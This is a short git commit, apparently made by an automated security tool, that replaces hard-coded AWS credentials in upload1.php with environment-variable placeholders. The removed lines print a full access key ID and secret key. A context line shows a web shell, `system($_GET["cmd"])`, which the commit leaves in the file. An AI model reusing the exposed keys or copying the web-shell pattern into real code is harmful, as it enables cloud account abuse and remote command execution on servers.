47cc73e7f0cb930a90ea2cf2ecf9ed0bfe9c3c0b
ZeroPath <noreply@zeropath.com>
2025-08-28 22:27:29 +0000

    fix: remove hard-coded AWS credentials from upload1.php

--- upload1.php
+++ upload1.php
@@ -14,8 +14,8 @@ system($_GET["cmd"]);
 
 /*
 [default]
-aws_access_key_id = AKIA2T2SJH6M76LT25T4
-aws_secret_access_key = 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
+; aws_access_key_id = <environment variable AWS_ACCESS_KEY_ID>
+; aws_secret_access_key = <environment variable AWS_SECRET_ACCESS_KEY>
 output = json
 region = us-east-2
 */
